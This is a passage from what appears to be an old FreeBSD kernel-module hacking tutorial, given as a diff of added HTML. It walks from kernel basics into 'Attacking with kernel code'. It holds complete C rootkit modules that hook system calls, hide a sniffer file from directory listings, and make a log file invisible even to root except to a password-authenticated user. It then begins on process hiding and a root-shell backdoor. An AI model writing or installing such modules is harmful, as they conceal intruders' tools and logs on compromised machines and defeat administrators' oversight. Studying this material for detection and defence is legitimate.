+#define GD_LINKFILES     2
+#define GD_MODULES       3
+
+typedef TAILQ_HEAD(, module) modulelist_t;
+
+/*import lock structure*/
+extern struct lock lock;
+
+/*import the linker_file list*/
+extern linker_file_list_t files;
+
+/*import module list*/
+extern modulelist_t modules;
+
+/*the module structure (normally defined in kern_module.c)*/
+struct module {
+ TAILQ_ENTRY(module) link;
+ TAILQ_ENTRY(module) flink;
+ struct linker_file *file;
+ int refs;
+ int id;
+ char *name;
+ modeventhand_t handler;
+ void *arg;
+ modspecific_t data;
+};
+
+/*structure for our getdata system call*/
+
+static struct getdata_args {
+ /*this int value stands for the data the user wants to see*/
+ int what;
+ /*this is a user space buffer where we will put the data*/
+ char *buffer;
+};
+
+
+/*the system call function we implement*/
+/*GENERAL WORKING :
+  This system call gets two arguments from a user space program : an integer
+  used as a switch parameter (what kernel list do we want) and a pointer to
+  an allocated user space memory location. If this pointer is zero the
+  system call will return the size of the requested list. This is useful for
+  selecting the buffer size in a second step.*/
+
+static 
+int getdata(struct proc *p, struct getdata_args *uap)
+{
+ int size, flag=0;
+ struct proc *pr;
+ linker_file_t lf=0;
+ module_t mod=0;
+
+ /*if the buffer is NULL then the user requests the list size*/
+ if (uap->buffer==NULL) flag=1;
+
+ /*which list does the user want*/
+ switch(uap->what) 
+ {
+  case GD_ALLPROC :
+  {
+   size=0;
+   pr=allproc.lh_first;
+   for (; pr!=0; pr=pr->p_list.le_next)
+   {
+    size+=sizeof(struct proc);
+   }
+   /*if the user only want the size, return it*/
+   if (flag==1) {p->p_retval[0]=size; break;}
+   pr=allproc.lh_first;
+   size=0;
+   /*otherwise returnthe structure into the user space buffer*7
+   for(; pr!=0; pr=pr->p_list.le_next)
+   {
+    copyout(pr, uap->buffer+size, sizeof(struct proc));
+    size+=sizeof(struct proc);
+   }
+   /*return number of procs returned in buffer*/
+   p->p_retval[0]=size/sizeof(struct proc);
+   break;
+  }
+  case GD_MODULES :
+  {
+   size=0;
+   for (mod=TAILQ_FIRST(&modules); mod; mod=TAILQ_NEXT(mod, link))
+   {  
+    size+=sizeof(struct module);
+   } 
+   if (flag==1) {p->p_retval[0]=size; break;}
+   size=0;
+   for (mod=TAILQ_FIRST(&modules); mod; mod=TAILQ_NEXT(mod, link))
+   {
+    copyout(mod, uap->buffer+size, sizeof(struct module));
+    size+=sizeof(struct module);
+   }
+   /*return number of procs returned in buffer*/
+   p->p_retval[0]=size/sizeof(struct module);
+   break;
+  }
+  case GD_LINKFILES :
+  {
+   size=0;
+   /*lock*/
+   lockmgr(&lock, LK_SHARED, 0, curproc);
+   for (lf=TAILQ_FIRST(&files); lf; lf=TAILQ_NEXT(lf, link))
+   {  
+    size+=sizeof(struct linker_file);
+   } 
+   /*unlock*/
+   lockmgr(&lock, LK_RELEASE, 0, curproc);
+   if (flag==1) {p->p_retval[0]=size; break;}
+   size=0;
+   lockmgr(&lock, LK_SHARED, 0, curproc);
+   for (lf=TAILQ_FIRST(&files); lf; lf=TAILQ_NEXT(lf, link))
+   {
+    copyout(lf, uap->buffer+size, sizeof(struct linker_file));
+    size+=sizeof(struct linker_file);
+   }
+   lockmgr(&lock, LK_RELEASE, 0, curproc);
+   /*return number of procs returned in buffer*/
+   p->p_retval[0]=size/sizeof(struct linker_file);
+   break;
+  }
+ }
+ return 0;
+}     
+        
+
+/*the hacked open syscall*/
+static struct sysent getdata_sysent = {
+       2,	
+       getdata			/* sy_call */
+};
+                                                                      
+                                                                              
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+ switch (cmd) {
+  case MOD_LOAD :
+   /*install the system call, UNLOAD will not remove it, I am too lazy :)*/
+   sysent[210]=getdata_sysent;
+  break;
+  case MOD_UNLOAD :
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+                                                   
+/*install the module as our MISC type*/
+static moduledata_t syscall_mod = {
+ "TheSeeker", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+  
+</xmp>
+This is no nice style programming style, but working. The copy* functions will
+be explained in I.8. Recognize that return values for user space a saved in
+a part of the module structure (p->p_retval[0]). The rest should be quite
+clear.<br>
+I also wrote a little user space program showing how to use this system call.
+Of course, you have to load the module before.
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <sys/lock.h>
+
+
+typedef struct linker_file* linker_file_t;
+
+struct linker_file {
+    int			refs;		/* reference count */
+    int			userrefs;	/* kldload(2) count */
+    TAILQ_ENTRY(linker_file) link;	/* list of all loaded files */
+    char*		filename;	/* file which was loaded */
+    int			id;		/* unique id */
+    caddr_t		address;	/* load address */
+    size_t		size;		/* size of file */
+    int			ndeps;		/* number of dependancies */
+    linker_file_t*	deps;		/* list of dependancies */
+    STAILQ_HEAD(, common_symbol) common; /* list of common symbols */
+    TAILQ_HEAD(, module) modules;	/* modules in this file */
+    void*		priv;		/* implementation data */
+
+    struct linker_file_ops* ops;
+};
+
+
+struct module {
+ TAILQ_ENTRY(module) link;
+ TAILQ_ENTRY(module) flink;
+ struct linker_file *file;
+ int refs;
+ int id;
+ char *name;
+ modeventhand_t handler;
+ void *arg;
+ modspecific_t data;
+};
+
+int errno;
+
+#define GD_ALLPROC       1
+#define GD_LINKFILES     2
+#define GD_MODULES       3
+
+
+/*structure for our getdata system call*/
+struct getdata_args {
+ /*this int value stands for the data the user wants to see*/
+ int what;
+ /*this is a user space buffer where we will put the data*/
+ char *buffer;
+};
+
+void print_allprocs()
+{
+ struct getdata_args gda;
+ int size;
+ struct proc *procs;
+ char *p;
+ int counter, tmp;
+
+ /*set the getdata fields*/
+ gda.what=GD_ALLPROC;
+ gda.buffer=NULL;
+ size=syscall (210, gda);
+
+ /*allocate some bytes*/
+ p=(char*)malloc(size); 
+ 
+ /*set the getdata fields*/
+ gda.what=GD_ALLPROC;
+ gda.buffer=(char*)p;
+ tmp=syscall(210, gda);
+ procs=(struct proc*)p;  
+
+ for (counter=0; counter<tmp; counter++)
+  printf("PID : %d\n", procs[counter].p_pid);
+ free(p); 
+}
+
+
+void print_files()
+{
+ struct getdata_args gda;
+ int size;
+ struct linker_file *procs;
+ char *p;
+ int counter, tmp;
+
+ /*set the getdata fields*/
+ gda.what=GD_LINKFILES;
+ gda.buffer=NULL;
+ size=syscall (210, gda);
+
+ printf("SIZE : %d\n", size);
+
+ /*allocate some bytes*/
+ p=(char*)malloc(size); 
+ 
+ /*set the getdata fields*/
+ gda.what=GD_LINKFILES;
+ gda.buffer=(char*)p;
+ tmp=syscall(210, gda);
+ printf("STRUCTS : %d\n", tmp);
+ procs=(struct linker_file*)p;  
+
+ for (counter=0; counter<tmp; counter++)
+  printf("ID : %d\n", procs[counter].id);
+
+ free(p); 
+}
+
+void print_modules()
+{
+ struct getdata_args gda;
+ int size;
+ struct module *procs;
+ char *p;
+ int counter, tmp;
+
+ /*set the getdata fields*/
+ gda.what=GD_MODULES;
+ gda.buffer=NULL;
+ size=syscall (210, gda);
+
+ printf("SIZE : %d\n", size);
+
+ /*allocate some bytes*/
+ p=(char*)malloc(size); 
+ 
+ /*set the getdata fields*/
+ gda.what=GD_MODULES;
+ gda.buffer=(char*)p;
+ tmp=syscall(210, gda);
+ printf("STRUCTS : %d\n", tmp);
+ procs=(struct module*)p;  
+ /*print the id of every module loaded so far*/
+ for (counter=0; counter<tmp; counter++)
+  printf("ID : %d\n", procs[counter].id);
+ free(p); 
+}
+
+
+
+int
+main(int argc, char **argv)
+{
+ print_modules();
+ return 0;
+}
+</xmp>
+
+Arghh, I hope no computer science professor will see this, it's a cruel kind of
+programming ;), but working [I hate it too loose time with nice software
+design...]. Of course, it would be very easy to make this program more
+compact, but I also wrote it this way to make it easier to understand. The
+different print_* functions will put out the desired information. The
+syscall() function calls a certain system call plus required arguments.<br>
+NOTE :
+This module is no perfect solution. Try to access a field like filename in a
+linker_file structure you get vie print_files. You will get a nice error, why?
+Look at the following image :
+<xmp>
+user space :
+
+----------------------------------------------------------------------------
+
+kernel space :            one linker_file structure             
+                          +++++++++++++++++++++++++
+                          +...                    +  
+                          + char *filename        +  ---------> name
+                          +...			  +  points to an address in
+   			  +...			  +  kernel space
+  			  +...			  +
+
+</xmp>
+Now what did our system call, take a look at the next image :
+<xmp>
+
+user space :              one linker_file structure             
+                          +++++++++++++++++++++++++
+                          +...                    +  
+                          + char *filename        +  ----
+                          +...			  +     |
+   			  +...			  +     |
+  			  +...			  +     |
+       							|
+							|
+							|
+----------------------------------------------------------------------------
+ 							|
+kernel space :						|
+ 							|---> name
+
+
+</xmp>
+Do you see the problem? The char* filename pointer still points to the old
+address in kernel space while the linker_file structure was move to user
+space. This means you cannot access any pointer fields in the structures /
+lists exported by TheSeeker module. Of course, you could also transform those
+address to user space, but that would be too complicated for a beginner
+example, so I did not implement it. Of course you can access any other fields
+that don't point to some location.
+
+<p>
+<H3><A NAME="I.8."></A>8. From User to Kernel space and back</h3>
+<p>
+
+In TheSeeker I introduced some kernel functions that were responsible for user
+<-> kernel space transitions. The following list shows all functions that are
+important for that task :
+<ul>
+<li>int copyin(const void *uaddr, void *kaddr, size_t len);<br>
+->copies len bytes from user space (uaddr) to kernel space (kaddr)<br>
+
+<li>int copyout(const void *kaddr, void *uaddr, size_t len);<br>
+->copies len bytes from kernel space (kaddr) to user space (uaddr)<br>
+
+<li>int copyinstr(const void *uaddr, void *kaddr, size_t len, size_t
+*done);<br> 
+->copies NUL-terminated string, at most len bytes long, fom user
+space (uaddr) to kernel space (kaddr). The number of bytes actually copied
+is returned in done.<br>
+</ul>
+I always used these functions. There are also some other byte-oriented
+functions (like fetch etc.) but I nver used them.
+The easiest task is to copy from user to kerne space. You have only to provide
+a buffer in kernel space. Take a look at the following fragment (taken from
+my directory hack) :
+<xmp>
+/*We need to define M_DIRP2 for allocating some memory in kernel space with
+  the help of the MALLOC macro*/
+MALLOC_DEFINE(M_DIRP2, "dirp2", "struct");
+
+...
+
+struct dirent *dirp2, *dirp3;
+  
+...
+
+/*allocate memory*/ 
+MALLOC(dirp2, struct dirent*, tmp, M_DIRP2, M_NOWAIT);
+
+...
+
+/*copy from user space (uap->buf) to kernel space (dirp2) tmp bytes*/
+copyin(uap->buf, dirp2, tmp);
+
+</xmp>
+Look at the MALLOC man page for more details. Of course you could also use
+something like char mem[100]; instead of MALLOC, but malloc is the better
+choice.<br>
+So copyin from user to kernel space a trivial. But what about the other
+direction? You have to differentiate between two cases : is there already an
+allocated buffer for the process in user space? If so just use copyout and you
+are done. But what to do if you don't have a memory buffer in user space. Look
+at my solution (I made lots of comments for beginners, please read them :)):
+<xmp>
+/*This example demonstrates how to use the OBREAK syscall to issue a system
+call from kernel mode. I implemented a syscall (offset 210) which will create
+a directory (TESTDIR) by using the mkdir syscall. The general problem with
+this task is supplying the arguments for mkdir from +user space+.*/
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+
+
+/* 
+ * Shareable process virtual address space.
+ * May eventually be merged with vm_map.
+ * Several fields are temporary (text, data stuff).
+ */
+struct vmspace {
+/*NOTE : I just used some padding stuff, to avoid too much include file
+         problems...
+*/
+/*	struct vm_map vm_map;	 VM address map */
+        char pad1[100];
+/*	struct pmap vm_pmap;	 private physical map */
+        char pad2[36];
+	int vm_refcnt;		/* number of references */
+	caddr_t vm_shm;		/* SYS5 shared memory private data XXX */
+/* we copy from vm_startcopy to the end of the structure on fork */
+#define vm_startcopy vm_rssize
+	segsz_t vm_rssize;	/* current resident set size in pages */
+	segsz_t vm_swrss;	/* resident set size before last swap */
+	segsz_t vm_tsize;	/* text size (pages) XXX */
+	segsz_t vm_dsize;	/* data size (pages) XXX */
+	segsz_t vm_ssize;	/* stack size (pages) */
+	caddr_t vm_taddr;	/* user virtual address of text XXX */
+	caddr_t vm_daddr;	/* user virtual address of data XXX */
+	caddr_t vm_maxsaddr;	/* user VA at max stack growth */
+	caddr_t vm_minsaddr;	/* user VA at max stack growth */
+};
+
+
+
+/*just a simple syscall handler which will create a dir entry*/
+static int user_syscall (struct proc *p, void *arg)
+{      
+ /*example directory we want to create from kernel space via syscall
+   recall that this string is saved in kernel context and not in user space
+   is we need it*/
+ char *kernel_name="./TESTDIR\0";
+
+ /*this will hold our address in user space (for the directory name)*/
+ char *user_name;
+
+ /*one structure for kernel space and one for the user part :
+   This structure is used by the syscall mkdir for holding the required
+   arguments (see system call listing)*/
+ struct mkdir_args kernel_ma;
+ struct mkdir_args *user_ma;
+
+ /*we need to allocate memory, so we use the easiest way : syscall obreak*/
+ struct obreak_args oa;
+
+ /*the process we want to 'abuse' for saving our data in its VM space.
+ I used curproc which always points to the current process.*/
+ struct proc *userproc=curproc;
+
+ /*NOTE : The following stuff is very experimental !
+   ----
+ */
+
+ /* 
+   allocate 4096 bytes of heap memory for the user space args :
+   ctob : transforms a given page count to the corresponding bytes count;
+          of course, this calculation depends on the underlying architecture
+   btoc : this is the counterpart to ctob
+ */
+ oa.nsize=userproc->p_vmspace->vm_daddr+ctob(userproc->p_vmspace->vm_dsize)+
+          4096; 
+
+ /*this is just for debugging*/
+ printf("Process ID                    : %d\n", userproc->p_pid);
+ printf("OLD DATA SEGMENT SIZE (bytes) : %d\n", ctob(userproc->p_vmspace->vm_dsize));
+ printf("OBREAK RETURN VALUE           : %d\n",obreak(userproc, &oa));
+ printf("NEW DATA SEGMENT SIZE (bytes) : %d\n", ctob(userproc->p_vmspace->vm_dsize));
+ 
+ /*move our directory name to a random location in the user space data segment
+   range (within the newly allocated page*/ 
+ user_name=oa.nsize-80; 
+
+ /*use copyout, which is able to copy from kernel to user space*/
+ copyout(kernel_name, user_name, strlen(kernel_name));
+
+ /*just for debugging : where did we save the name in user space?*/
+ printf("USER NAME ADDRESS  : %p\n", user_name);
+
+ /*now it gets a bit tricky : 
+   --------------------------
+   we move the VM address from user space into the kernel_ma.path pointer in
+   kernel space*/  
+
+ kernel_ma.path=oa.nsize-80;
+ 
+ /*creation mode = 0*/
+ kernel_ma.mode=0;  
+
+ /*NOW the kernel_ma structure is ok, we can copy this structure to user space
+ */ 
+
+ /*select a place (within the allocated page) where to put the user_ma
+   structure*/
+ user_ma=(struct mkdir_args*)oa.nsize-50;
+
+ /*again a copyout*/
+ copyout(&kernel_ma, user_ma, sizeof(struct mkdir_args));
+
+ /*again some debug messages*/
+ printf("USER STRUCT ADDRESS : %p\n",user_ma);
+
+ /*Issue the mkdir syscall. Did we succeed ? Zero return value stands for
+   success.*/  
+ printf("MKDIR RETURN        : %d\n", mkdir(userproc, user_ma));
+
+ return 0;
+}
+
+/*
+ * The `sysent' for the new syscall
+ */
+static struct sysent user_syscall_sysent = {
+        0,	
+	user_syscall			/* sy_call */
+};
+
+/*
+ * The offset in sysent where the syscall is allocated.
+ */
+
+/*210 is a free slot in FreeBSD 3.1*/
+static int offset = 210;
+
+/*
+ * The function called at load/unload.
+ */
+static int
+load (struct module *module, int cmd, void *arg)
+{
+ /*no special processing here*/
+ return 0;
+}
+
+SYSCALL_MODULE(syscall, &offset, &user_syscall_sysent, load, NULL);
+</xmp>
+The comments should make everything quite clear. The general idea is to use
+the obreak system call to allocate some memory (move the vm_daddr).
+
+<p>
+<H3><A NAME="I.9."></A>9. Last Words</h3>
+<p>
+I hope you understood the stuff I mentioned in this basic section. It's really
+important that you get the general ideas in order to understand part II.<br>
+You should take a look at the man pages of section 9. There you can find some
+interesting kernel functions that will be useful sometimes.
+
+<p>
+<H3><A NAME="II."></A>II. Attacking with kernel code</h3>
+<p>
+The general layout of this article is based on my Linux article. Part II Fun
+& Profit will deal with ways to attack a FreeBSD system with modules. My Linux
+article shows nearly every aspect of attacking a system with kernel code. The
+FreeBSD part here is based on the ideas of Linux LKM hacks (I only added some
+items special for FreeBSD). This FreeBSD part will only present those modules,
+that needed big code/strategy modifications according to the Linux ones.
+
+<p>
+<H3><A NAME="II.1."></A>1. How to intercept system calls</h3>
+<p>
+Intercepting systemcalls on FreeBSD is nearly the same like doing this on a
+Linux Box. Again we start with a very very basic example :
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+
+
+/*The hacked system call*/
+static int
+hacked_mkdir (struct proc *p, struct mkdir_args *ua)
+{      
+ /*the only thing we do is printing a debug message*/
+ printf("MKDIR SYSCALL :  %s\n", ua->path);
+ return	mkdir(p, ua);
+}
+
+
+/*the sysentry for the hacked system call. Be careful, argument count must be
+same for the hacked and the origanel system call (here 1)*/
+
+static struct sysent
+hacked_mkdir_mkdir_sysent = {        
+       1,	
+       hacked_mkdir			/* sy_call */
+};
+
+
+/*our load function*/
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+
+ switch (cmd) {
+  case MOD_LOAD :
+   /*replace the mkdir syscall with our own*/
+   sysent[SYS_mkdir]=hacked_mkdir_mkdir_sysent;
+  break;
+  case MOD_UNLOAD :
+   /*argument count has not changed, so we only need to restore the
+   function pointer*/
+   sysent[SYS_mkdir].sy_call=(sy_call_t*)mkdir;
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+  
+static moduledata_t syscall_mod = {
+ "Intercept", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+  
+</xmp>
+As you can see you don't have to save the old sysent entry, you just refer to
+the original system call function (no problems like those we had with Linux
+concerning public and private kernel items).<br>
+Compile this module (as always take the Makefile from part I) and load it.
+Every mkdir system call will produce a nice debug message. <br>
+For those who don't know which system call to intercept, again : read my Linux
+article. On FreeBSD ktrace can be quite useful.
+
+<p>
+<H3><A NAME="II.2."></A>2. Filesystem related hacks</h3>
+<p>
+Like the Linux one, we first start with filesystem hacks. They are really
+important for hiding our tools & logs.
+
+<p>
+<H3><A NAME="II.2.1."></A>2.1. How to hide files</h3>
+<p>
+
+The following module represents the getdirentries hack that will hide a certain
+file from directory listings made by commands like 'ls' :<br>
+Note :
+In Phrack (Volume 7, Issue 51 September 01, 1997, article 09) halflife already
+presented a nice hack for this problem. It was implemented under FreeBSD 2.2
+using the LKM scheme. He used a very short and good way to manage file hiding.
+My code below does the same stuff for FreeBSD 3.x systems. My approach is not
+so short, because I did user <-> kernel space transitions for clearness. The
+whole thing would also work without this stuff, but my module can easily be
+extended to do other things, because all relevant structures are copied to
+kernel space so you can modify them how ever you want before they are copied
+back.
+
+<xmp>
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <dirent.h>
+
+
+/*We need to define M_DIRP2 for allocating some memory in kernel space with
+  the help of the MALLOC macro*/
+MALLOC_DEFINE(M_DIRP2, "dirp2", "struct");
+
+
+/*This hack is based on the getdents idea from some linux LKMs. FreeBSD is
+ a bit more tricky, but it works.*/
+static int
+hacked_getdirentries (struct proc *p, struct getdirentries_args *uap)
+{      
+ unsigned int tmp, n, t;
+ struct dirent *dirp2, *dirp3;
+  
+ /*The file we want to hide : The name must match exactly !*/
+ char hide[]="sniffer";
+
+ /*just issue the syscall*/
+ getdirentries(p,uap);
+ 
+ /*this is the way BSD returns status values to the process issueing the
+   request.*/
+ tmp=p->p_retval[0];
+ 
+ if (tmp>0)
+ { 
+  /*allocate memory*/
+  MALLOC(dirp2, struct dirent*, tmp, M_DIRP2, M_NOWAIT);
+  /*copy the dirent structure for user space in our kernel space*/
+  copyin(uap->buf, dirp2, tmp);
+
+  /*dirp3 points to dirp2*/
+  dirp3=dirp2;
+ 
+  t=tmp;
+  
+  /*In this loop we check for every dirent structure in the user buffer*/
+  while (t > 0)
+  {
+   n = dirp3->d_reclen;
+   t-=n;
+   /*Do we have the entry for our file to hide*/
+   if (strcmp((char*)&(dirp3->d_name), (char*)&hide)==0) 
+   {
+    if (t!=0)  
+    {
+     /*ATTENTION : Do not use something like strcpy or so. bcopy is able to
+                   handle overlapping memroy locations, so this is our choice*/
+     bcopy((char*)dirp3+n,dirp3, t);
+    }
+    /*the dirent structure list is shorter now*/
+    tmp-=n;
+   }
+   /*The following piece of code is necessary, because we get one dirent entry
+     with d_reclen=0, if we would not implement this, we would get an infinite
+     while loop*/
+   if (dirp3->d_reclen==0) 
+   {
+    /*end is reached*/
+    t=0;
+   }
+   /*as long as there is something to copy, do it*/
+   if (t!=0)
+    /*get the next pointer from the dirent structure list*/ 
+    dirp3=(struct dirent*)((char*)dirp3+dirp3->d_reclen); 
+  }
+  /*we must decrement the getdirentries user call return value, if we changed
+    something*/
+   p->p_retval[0]=tmp; 
+
+  /*copy the whole (perhaps modified) memory back to the user buffer*/
+  copyout(dirp2, uap->buf, tmp);
+ 
+  /*free kernel memory*/
+  FREE(dirp2, M_DIRP2);
+ }
+ /*everything ok, so return 0*/
+ return	0;
+}
+
+/*the hacked getdirentries syscall*/
+static struct sysent hacked_getdirentries_sysent = {
+       4,	
+       hacked_getdirentries			/* sy_call */
+};
+
+
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+
+ switch (cmd) {
+  case MOD_LOAD :
+   /*replace the getdirentries syscall with our own*/
+   sysent[196]=hacked_getdirentries_sysent;
+  break;
+  case MOD_UNLOAD :
+   /*argument count has not changed, so we only need to restore the
+   function pointer*/
+   sysent[196].sy_call=(sy_call_t*)getdirentries;
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+
+/*you will recognize that this part is the same (I only changed the module
+  name) for every module I present.*/
+static moduledata_t syscall_mod = {
+ "FileHider", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>
+The general idea is the same for FreeBSD and Linux, but there are some
+differences concerning the coding. Especially the return value modification
+must be done in a different way. My comments should be clear, so try it. 
+
+<p>
+<H3><A NAME="II.2.2."></A>2.2 How to hide the file contents</h3>
+<p>
+The following implementation is an extension to the Linux one. The Linux module
+was hiding a file contents so that a 'cat filename' returned with a 'file does
+not exist' errror. I implemented no way for you (hacker) to access this file, I
+only suggested some methods how to do it. The following module also implements
+a way to access it by you :
+<xmp>
+/*This module demonstrates how to make a file unaccessible. It has a
+authentication scheme which allows someone using the correct password (here
+007) to access the file. Only this user (represented by UID) can access it
+later. The password (007) is given through a newly defined syscall.*/
+
+#include <sys/types.h>
+#include <sys/param.h>
+#include <sys/proc.h>
+#include <sys/module.h>
+#include <sys/sysent.h>
+#include <sys/kernel.h>
+#include <sys/systm.h>
+#include <sys/linker.h>
+#include <sys/sysproto.h>
+#include <sys/sysent.h>
+#include <sys/proc.h>
+#include <sys/syscall.h>
+#include <sys/file.h>
+#include <sys/malloc.h>
+#include <sys/types.h>
+#include <dirent.h>
+
+/*this variable will hold the UID of the user who issued the system call with
+the correct code*/
+
+uid_t access_uid=-1;
+
+/*code for authentication*/
+
+#define CODE 007
+
+
+/* 
+ * Shareable process virtual address space.
+ * May eventually be merged with vm_map.
+ * Several fields are temporary (text, data stuff).
+ */
+struct vmspace {
+/*NOTE : I just used some padding stuff, to avoid too much include file
+         problems...
+*/
+/*	struct vm_map vm_map;	 VM address map */
+        char pad1[100];
+/*	struct pmap vm_pmap;	 private physical map */
+        char pad2[36];
+	int vm_refcnt;		/* number of references */
+	caddr_t vm_shm;		/* SYS5 shared memory private data XXX */
+/* we copy from vm_startcopy to the end of the structure on fork */
+#define vm_startcopy vm_rssize
+	segsz_t vm_rssize;	/* current resident set size in pages */
+	segsz_t vm_swrss;	/* resident set size before last swap */
+	segsz_t vm_tsize;	/* text size (pages) XXX */
+	segsz_t vm_dsize;	/* data size (pages) XXX */
+	segsz_t vm_ssize;	/* stack size (pages) */
+	caddr_t vm_taddr;	/* user virtual address of text XXX */
+	caddr_t vm_daddr;	/* user virtual address of data XXX */
+	caddr_t vm_maxsaddr;	/* user VA at max stack growth */
+	caddr_t vm_minsaddr;	/* user VA at max stack growth */
+};
+
+
+/*arguments for the check_code system call*/
+struct check_code_args {
+ int code;
+};
+
+/*after this check only the one who issued the syscall from user space is able
+to access the file/directory or whatever (only this UID can access it). Of
+course, before, he must supply the correct code.*/ 
+
+static 
+void check_code(struct proc *p, struct check_code_args *uap)
+{
+ if (uap->code==CODE)
+  access_uid=p->p_cred->pc_ucred->cr_uid;
+ else 
+  access_uid=-1;
+}
+
+
+/*the hacked open syscall*/
+static 
+int hacked_open(struct proc *p, struct open_args *uap)
+{
+ char name[255];
+ /*the file we want to hide*/
+ char hide_name[]="sniffer.log";
+ size_t done;
+
+ /*get name*/
+ copyinstr(uap->path, name, 255, &done);
+ /*do we have the right file name?*/
+ if (strcmp((char*)&name, (char*)&hide_name)==0)
+ {
+  /*does this user have the right to access the file*/
+  if (access_uid==p->p_cred->pc_ucred->cr_uid)
+  {
+   /*if so, do a normal open*/
+   return open(p, uap);
+  }
+  /*no he has not got the right*/
+  else
+   /*standing for 'no such file or directory*/
+   return ENOENT;
+ }
+ /*if we don't have our file, just continue*/ 
+ return open(p, uap);
+}
+
+
+/*the hacked open syscall*/
+static struct sysent hacked_open_sysent = {
+       3,	
+       hacked_open			/* sy_call */
+};
+
+
+/*check code sysentry*/
+static struct sysent check_code_sysent = {
+       1,
+       check_code
+};
+
+/*
+ * The function called at load/unload.
+ */
+static int
+dummy_handler (struct module *module, int cmd, void *arg)
+{
+ int error = 0;
+ switch (cmd) {
+  case MOD_LOAD :
+   /*replace the open syscall with our own*/
+   sysent[SYS_open]=hacked_open_sysent;
+   /*install check code system call (slot/number 210)*/
+   sysent[210]=check_code_sysent;
+  break;
+  case MOD_UNLOAD :
+   /*argument count has not changed, so we only need to restore the
+   function pointer*/
+   sysent[SYS_open].sy_call=(sy_call_t*)open;
+  break;
+  default :
+   error = EINVAL;
+  break;
+ }
+ return error;
+}
+                                                   
+          
+static moduledata_t syscall_mod = {
+ "OpenHide", 
+ dummy_handler,
+ NULL
+};
+
+DECLARE_MODULE(syscall, syscall_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
+</xmp>
+
+The open hack in general should be clear. If we have our filename we just
+return 'no such file...'. The solution I present to access this file via an
+authentication scheme is quite powerful. The user space program is very easy,
+just issue a system call with syscall() with the correct code (I won't present
+code because it's really too easy).<br>
+After providing the correct code only you (your UID) has access to this file.
+Even root cannot access it (he will also get 'no such file...').
+
+<p>
+<H3><A NAME="II.2.3."></A>2.3 And the rest?</h3>
+<p>
+Those who read my Linux LKM article will recognize that I explained more hacks
+(like file operation redirection, mkdir interception etc.). Why don't I
+present them here? Because these hacks are trivial to implement after the
+things I said already. 
+
+<p>
+<H3><A NAME="II.3."></A>3. Process related hacks</h3>
+<p>
+This section will introduce some modules making it possible to hide any
+process and install a backdoor rootshell. 
+
+<p>
+<H3><A NAME="II.3.1."></A>3.1 How to hide any process</h3>
+<p>
+Well, I have to admit that it wasn't very easy to make this possible on
+FreeBSD. And the following solution is quite experimental (but working, of
+course). You have to know that FreeBSD uses the so called KVM library to get
+information on the processes of the system (it is a library interface to the
+allproc and zombroc lists). Besides this, commands like top also use the
+procfs. This means we have to attack two points. Hiding an entry from the
+procfs is easy (just hide the PID from getdirentries), but what about the KVM
+lib. Let me explain some words. The following explaination makes things easier
+than they are in reality, but it's enough for a general understanding.
+We start with a code snippet from the 'ps' command :
+<xmp>
+/*
+	 * select procs
+	 */
+	if ((kp = kvm_getprocs(kd, what, flag, &nentries)) == 0)
+		errx(1, "%s", kvm_geterr(kd));
+      
+	if ((kinfo = malloc(nentries * sizeof(*kinfo))) == NULL)
+		err(1, NULL);
+	printf("SIZE %d\n", nentries*sizeof(*kinfo));
+       for (i = nentries; --i >= 0; ++kp) {
+		kinfo[i].ki_p = kp;
+		if (needuser)
+			saveuser(&kinfo[i]);
+		dynsizevars(&kinfo[i]);
+	}
+
+	sizevars();
+
+	/*
+	 * print header
+	 */
+	printheader();
+	if (nentries == 0)
+		exit(0);
+	/*
+	 * sort proc list
+	 */
+	qsort(kinfo, nentries, sizeof(KINFO), pscomp);
+	/*
+	 * for each proc, call each variable output function.
+	 */
+	for (i = lineno = 0; i < nentries; i++) {
+		if (xflg == 0 && (KI_EPROC(&kinfo[i])->e_tdev == NODEV ||
+		    (KI_PROC(&kinfo[i])->p_flag & P_CONTROLT ) == 0))
+			continue;
+		for (vent = vhead; vent; vent = vent->next) {
+			(vent->var->oproc)(&kinfo[i], vent);
+			if (vent->next != NULL)
+				(void)putchar(' ');
+		}
+		(void)putchar('\n');
+		if (prtheader && lineno++ == prtheader - 4) {
